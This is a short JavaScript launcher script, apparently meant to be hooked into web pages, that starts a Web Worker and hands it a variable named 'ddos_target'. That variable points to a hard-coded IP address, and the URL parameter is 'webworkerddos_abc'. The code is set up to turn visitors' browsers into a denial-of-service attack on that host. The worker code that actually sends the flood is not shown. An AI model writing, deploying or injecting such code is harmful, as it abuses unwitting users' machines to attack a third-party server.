//run_worker.js : hookjs named run_worker.js
var noWorker = typeof Worker == "undefined"?true:false; //判断是否支持
var ddos_target="http://216.24.201.98/tools/55xSer.php?p=webworkerddos_abc";
if(!noWorker){
	try{
        var worker =new Worker("worker.js"); //创建worker
        worker.postMessage(ddos_target);     //向创建的worker线程发送消息
        worker.onmessage =function(evt){     
          console.log(evt.data);              //控制台打印接收的信息
        }
  }catch(e){
  	e=e+"";
  	alert(e);
    if(e.indexOf("Worker is not enabled")!=-1){
    	noWorker=true;
    }  	
  	
  }
}
    